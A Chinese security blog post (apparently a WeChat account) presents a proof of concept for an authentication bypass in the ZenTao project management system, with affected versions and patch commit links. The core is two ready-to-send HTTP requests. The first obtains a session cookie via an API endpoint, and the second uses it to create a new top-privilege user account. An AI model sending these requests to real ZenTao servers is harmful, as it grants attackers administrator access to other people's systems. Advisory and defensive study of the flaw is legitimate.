#  N/A｜禅道项目管理系统身份认证绕过漏洞（POC）   
alicy  信安百科   2024-05-01 20:59  
  
**0x00 前言**  
  
****  
禅道是由青岛易软天创网络科技有限公司开发的开源项目管理软件，基于敏捷和CMMI管理理念进行设计，集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，完整覆盖研发项目管理的核心流程。  
  
  
  
**0x01 漏洞描述**  
  
****> 禅道项目管理系统存在身份认证绕过漏洞，远程攻击者利用该漏洞可以绕过身份认证，调用任意API接口并修改管理员用户的密码，并以管理员用户登录该系统。  
  
  
  
  
  
**0x02 CVE编号**  
  
  
无  
  
  
  
**0x03 影响版本**  
  
  
v16.x<=禅道< v18.12（开源版）  
  
v6.x<=禅道< v8.12（企业版）  
  
v3.x<=禅道< v4.12（旗舰版）  
  
  
  
**0x04 漏洞详情**  
  
****  
POC：  
  
获取  
zentaosid的值  
```
GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1
Host: you-ip
```  
  
‍  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urkUWohlvXmWLdpicDd05lAaD7jQQv7LVObciaIbmLcSw16gZWiaZKSro4Q5BsFhlGpGHJk9DtHD6IFQ/640?wx_fmt=png&from=appmsg "")  
  
  
添加用户：  
```
POST /zentao/api.php/v1/users HTTP/1.1
Cookie: zentaosid=xxxxxxxxxx
Host: you-ip

{"account": "zxczxc123", "password": "admin@123", "realname": "zxczxc123", "role": "top", "group": "1"}
```  
  
返回403也可以登陆。  
  
  
  
**0x05 参考链接**  
  
  
https://github.com/easysoft/zentaopms  
  
  
https://github.com/easysoft/zentaopms/commit/d13ba70016ca981b08f27e08fb934bf1f23a4135  
  
  
https://github.com/easysoft/zentaopms/commit/695055c6b1d2e6a8c944bdbc38308c06820c40ce  
  
  
  
  
推荐阅读：  
  
  
[CVE-2024-21007｜WebLogic 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485230&idx=1&sn=f2dc70906cf7d43bb91d8e61599b879d&chksm=cea96ef7f9dee7e1ebae59ba13ad4337d411ee916a085a5bc1e21df541092076626e49c3d0f8&scene=21#wechat_redirect)  
  
  
  
[N/A｜kkFileView 任意文件上传导致远程代码执行漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485230&idx=2&sn=1a7e2db8d66b6d96c04e806ca38f1735&chksm=cea96ef7f9dee7e1839fbeb90b3eea0137949aea556a4dc585e9876a7171841b7792614d737d&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-3400｜Palo Alto Networks PAN-OS 命令注入漏洞](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485179&idx=1&sn=484e7b82698441e1fb1d962c2c49e823&chksm=cea96f22f9dee6343278e915b81c8c64f5b982f2274788232e51906549b639316211cdd3f127&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
  
